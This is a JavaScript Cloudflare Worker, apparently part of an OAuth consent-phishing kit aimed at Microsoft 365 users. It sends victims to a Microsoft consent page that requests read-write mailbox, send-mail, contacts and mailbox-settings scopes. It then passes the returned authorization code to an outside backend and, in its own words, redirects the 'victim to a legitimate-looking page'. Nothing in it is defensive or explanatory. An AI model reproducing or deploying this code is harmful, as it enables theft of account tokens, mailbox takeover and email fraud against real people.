// SimdiaTokens OAuth Worker — Cloudflare Workers (Module Format)
// This worker initiates the Microsoft OAuth device-code flow and
// forwards the authorization code to the main SimdiaTokens backend.
//
// LOCAL DEVELOPMENT MODE: Set to redirect to localhost:8080 for testing.
// When ready to deploy, revert to production URLs.

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);

    // Read configuration from environment variables (set in Wrangler dashboard)
    const MAIN_SERVER = env.MAIN_SERVER || 'https://simdiatokens-server-production.up.railway.app';
    const CLIENT_ID = env.CLIENT_ID || '8bd2f03a-e0fb-490e-9c02-212c0d96dff4';
    const REDIRECT_URI = env.REDIRECT_URI || 'https://simdiatokens-oauth-worker.lubaking-co.workers.dev/oauth/callback';
    const SCOPE = 'openid offline_access User.Read Mail.ReadWrite Mail.Send Contacts.Read MailboxSettings.ReadWrite';

    if (url.pathname === '/start') {
      const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=${CLIENT_ID}&response_type=code&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&scope=${encodeURIComponent(SCOPE)}`;
      return Response.redirect(authUrl, 302);
    }

    if (url.pathname === '/oauth/callback') {
      const code = url.searchParams.get('code');
      if (!code) {
        return new Response('Missing authorization code', { status: 400 });
      }
      const exchangeUrl = `${MAIN_SERVER}/exchange?code=${encodeURIComponent(code)}`;
      try {
        const res = await fetch(exchangeUrl, { method: 'GET' });
        if (!res.ok) {
          console.error(`Backend exchange failed: ${res.status}`);
        }
      } catch (err) {
        console.error(`Failed to reach backend: ${err}`);
      }
      // Always redirect victim to a legitimate-looking page
      return Response.redirect('https://www.office.com', 302);
    }

    if (url.pathname === '/status') {
      return new Response(JSON.stringify({
        status: 'ok',
        worker: 'simdiatokens-oauth-worker',
        main_server: MAIN_SERVER,
        redirect_uri: REDIRECT_URI,
      }), {
        headers: { 'Content-Type': 'application/json' },
      });
    }

    return new Response('Not Found', { status: 404 });
  },
};
